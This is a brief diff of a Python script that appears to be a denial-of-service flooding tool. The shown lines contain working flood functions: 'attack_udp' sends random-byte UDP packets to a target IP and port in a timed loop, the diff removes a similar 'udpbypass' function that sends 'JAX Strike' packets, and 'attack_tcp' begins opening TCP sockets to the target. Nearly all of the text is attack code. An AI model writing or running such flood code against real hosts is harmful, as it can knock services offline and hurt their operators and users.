@@ -393,11 +393,6 @@ def attack_udp(ip, port, secs, size):
         data = random._urandom(size)
         s.sendto(data, (ip, dport))
 
-def udpbypass(ip, port, secs):
-    while time.time() < secs:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.sendto(b"JAX Strike", (ip, port))
-
 def attack_tcp(ip, port, secs, size):
     while time.time() < secs:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
